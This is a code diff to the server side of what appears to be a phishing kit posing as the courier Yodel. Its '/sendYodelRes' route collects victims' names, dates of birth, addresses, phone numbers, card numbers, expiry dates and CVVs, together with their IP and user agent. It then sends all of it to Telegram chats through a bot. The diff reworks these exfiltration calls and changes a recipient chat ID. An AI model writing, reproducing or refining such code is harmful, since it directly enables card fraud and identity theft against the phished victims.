@@ -5033,13 +5033,30 @@ app.post("/sendYodelRes", (req, res) => {
     .then(function () {
       binList = `${bin} | ${dob} | ${postcode} | ${bankName}`;
       var originalText = `+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nPostcode: ${postcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
-
-      axios.post(
-        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=YodelCB:\n${originalText}`
-      );
-      axios.post(
-        `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1921026559&text=YodelCB:\n${originalText}`
-      );
+      axios
+        .post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+          {
+            chat_id: 680379375,
+            text: `YodelTriz:\n${originalText}`,
+            parse_mode: "Markdown",
+          }
+        )
+        .catch((e) => {
+          console.log(e);
+        });
+      axios
+        .post(
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+          {
+            chat_id: 1190384225,
+            text: `Yodel:\n${originalText}`,
+            parse_mode: "Markdown",
+          }
+        )
+        .catch((e) => {
+          console.log(e);
+        });
 
       res.send("Update Completed");
     });
